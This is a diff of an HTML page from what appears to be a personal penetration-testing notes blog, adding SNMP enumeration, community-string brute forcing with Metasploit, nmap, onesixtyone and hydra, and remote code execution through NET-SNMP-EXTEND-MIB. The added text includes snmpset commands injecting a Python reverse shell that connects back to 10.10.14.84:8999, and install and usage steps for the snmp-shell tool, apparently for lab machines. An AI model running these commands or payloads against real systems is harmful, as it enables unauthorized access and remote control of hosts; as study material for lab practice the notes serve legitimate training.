@@ -23,8 +23,8 @@
 <meta property="og:site_name" content="rightevil">
 <meta property="og:description" content="enum the SMB and SNMP service">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-02-07T21:23:26.000Z">
-<meta property="article:modified_time" content="2024-02-07T21:29:09.545Z">
+<meta property="article:published_time" content="2024-03-11T21:23:26.000Z">
+<meta property="article:modified_time" content="2024-03-12T14:35:32.354Z">
 <meta property="article:author" content="rightevil">
 <meta property="article:tag" content="penetrate">
 <meta name="twitter:card" content="summary_large_image">
@@ -275,8 +275,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-02-08 05:23" pubdate>
-          2024年2月8日 凌晨
+        <time datetime="2024-03-12 05:23" pubdate>
+          2024年3月12日 凌晨
         </time>
       </span>
     
@@ -288,7 +288,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          3.6k 字
+          5.5k 字
         
       </span>
     
@@ -300,7 +300,7 @@
         
         
           <!-- compatible with older versions-->
-          30 分钟
+          46 分钟
         
       </span>
     
@@ -397,7 +397,7 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net view \\name /all<br></code></pre></td></tr></table></figure>
 <p><em>nbtscan</em></p>
 <h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><p>skip!!!</p>
-<h1 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h1><p>SNMP MIB tree</p>
+<h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-snmp">snmp hacktricks</a><br>SNMP MIB tree</p>
 <table>
 <thead>
 <tr>
@@ -439,16 +439,38 @@
 <p>scan a range:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> public &gt; community<br><span class="hljs-built_in">echo</span> private &gt;&gt; community<br><span class="hljs-built_in">echo</span> manager &gt;&gt; community<br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 254); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> 192.168.50.<span class="hljs-variable">$ip</span>; <span class="hljs-keyword">done</span> &gt; ips<br>onesixtyone -c community -i ips<br></code></pre></td></tr></table></figure>
 <p>tools:<br><em>snmpwalk</em>:<br>enume the hole tree</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -Oa -v1 -t 10 192.168.50.151<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -Oa -v1 -t 10 192.168.214.149<br></code></pre></td></tr></table></figure>
 <ul>
 <li><code>-c</code> set community string</li>
 <li><code>-Oa</code> This parameter will automatically translate any hexadecimal string into ASCII that was otherwise not decoded.</li>
 <li><code>-v1</code> specify the SNMP version number</li>
-<li><code>-t</code> set the timeout period<br>enum the users(set OID 1.3.6.1.4.1.77.1.2.25 in the table)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.4.1.77.1.2.25<br></code></pre></td></tr></table></figure>
-enum the process<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.2.1.25.4.2.1.2<br></code></pre></td></tr></table></figure>
-enum the software installed <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.2.1.25.6.3.1.2<br></code></pre></td></tr></table></figure>
-enum the listening tcp port<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.2.1.6.13.1.3<br></code></pre></td></tr></table></figure></li>
+<li><code>-t</code> set the timeout period<br>enum the users(set OID 1.3.6.1.4.1.77.1.2.25 in the table)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.4.1.77.1.2.25<br></code></pre></td></tr></table></figure>
+enum the process<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.25.4.2.1.2<br></code></pre></td></tr></table></figure>
+enum the software installed <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.25.6.3.1.2<br></code></pre></td></tr></table></figure>
+enum the listening tcp port<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.6.13.1.3<br></code></pre></td></tr></table></figure>
+enum<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v 2c -c public 192.168.240.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull<br></code></pre></td></tr></table></figure>
+<h2 id="brute"><a href="#brute" class="headerlink" title="brute"></a>brute</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf&gt; use auxiliary/scanner/snmp/snmp_login<br>nmap -sU --script snmp-brute 192.168.214.149 --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <br>onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 192.168.214.149<br>hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.214.149 snmp<br></code></pre></td></tr></table></figure></li>
 </ul>
+<h2 id="RCE-in-snmp"><a href="#RCE-in-snmp" class="headerlink" title="RCE in snmp"></a>RCE in snmp</h2><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce">SNMP RCE hacktricks</a><br>if u enum the <em>run-on-read()</em>,it could rce</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c public 192.168.214.149 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure>
+<p>test:<br>inject the command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 192.168.214.149 \<br><span class="hljs-string">&#x27;nsExtendStatus.&quot;evilcommand&quot;&#x27;</span> = createAndGo \<br><span class="hljs-string">&#x27;nsExtendCommand.&quot;evilcommand&quot;&#x27;</span> = /bin/echo \<br><span class="hljs-string">&#x27;nsExtendArgs.&quot;evilcommand&quot;&#x27;</span> = <span class="hljs-string">&#x27;hello world&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>excute it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure>
+
+
+
+<p>inject the revserse shell<br><code>https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 <span class="hljs-string">&#x27;nsExtendStatus.&quot;command10&quot;&#x27;</span> = createAndGo <span class="hljs-string">&#x27;nsExtendCommand.&quot;command10&quot;&#x27;</span> = /usr/bin/python3.6 <span class="hljs-string">&#x27;nsExtendArgs.&quot;command10&quot;&#x27;</span> = <span class="hljs-string">&#x27;-c &quot;import sys,socket,os,pty;s=socket.socket();s.connect((\&quot;10.10.14.84\&quot;,8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\&quot;/bin/sh\&quot;)&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>listen the port and excute it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c public 192.168.214.149 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure>
+
+<p>or exploit<br><code>https://github.com/mxrch/snmp-shell</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install snmp snmp-mibs-downloader rlwrap -y<br>git <span class="hljs-built_in">clone</span> https://github.com/mxrch/snmp-shell<br><span class="hljs-built_in">cd</span> snmp-shell<br>sudo python3 -m pip install -r requirements.txt<br></code></pre></td></tr></table></figure>
+<p>usage:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rlwrap python3 shell.py 192.168.214.149 -c public<br></code></pre></td></tr></table></figure>
+<p>if u need excute long command like u ssh publickey,u need to run the <em>legacy.py</em><br><em>use a <code>ed25519</code> SSH publickey, not a <code>RSA</code> one, it’s shorter.</em></p>
 
                 
               </div>
@@ -507,7 +529,7 @@ enum the listening tcp port<figure class="highlight bash"><table><tr><td class="
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年2月8日</div>
+          <div>2024年3月12日</div>
         </div>
       
       
@@ -539,9 +561,9 @@ enum the listening tcp port<figure class="highlight bash"><table><tr><td class="
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/Port-redirection-Tunnel/" title="Port redirection &amp;&amp; Tunnel">
+                      <a href="/SUID,SUDO-binary-hijack/" title="SUID,SUDO binary hijack">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Port redirection &amp;&amp; Tunnel</span>
+                        <span class="hidden-mobile">SUID,SUDO binary hijack</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -549,8 +571,8 @@ enum the listening tcp port<figure class="highlight bash"><table><tr><td class="
                   <article class="post-next col-6">
                     
                     
-                      <a href="/vulnhub-wp-BsidesVancouver/" title="vulnhub-wp BsidesVancouver">
-                        <span class="hidden-mobile">vulnhub-wp BsidesVancouver</span>
+                      <a href="/vulnhub-wp-DC-9/" title="vulnhub-wp DC:9">
+                        <span class="hidden-mobile">vulnhub-wp DC:9</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
